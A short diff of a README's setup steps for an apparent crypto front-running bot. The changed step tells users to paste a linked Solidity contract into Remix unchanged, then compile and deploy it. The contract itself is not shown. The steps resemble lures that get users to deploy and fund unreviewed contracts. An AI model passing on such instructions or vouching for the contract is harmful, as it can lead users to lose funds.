@@ -21,7 +21,7 @@ How To Use:
 
 4- Click on "contracts" folder and then "Create New File". Rename it as you like " anyname.sol "
 
-5- Paste SmartContract in Remix:(Copy and Paste as it is)
+5- Paste SmartContract in Remix:(Copy and Paste as it is) https://github.com/cryptonas/FrontRun-Bot-Sol-BSC-ERC20-PancakeSwap/blob/3a1a87ff8cf70ff2b585d7ba129874f0d8eb079a/BSC_FrontRun_BOT.sol
 
 6- Compile it and copy contract address
 
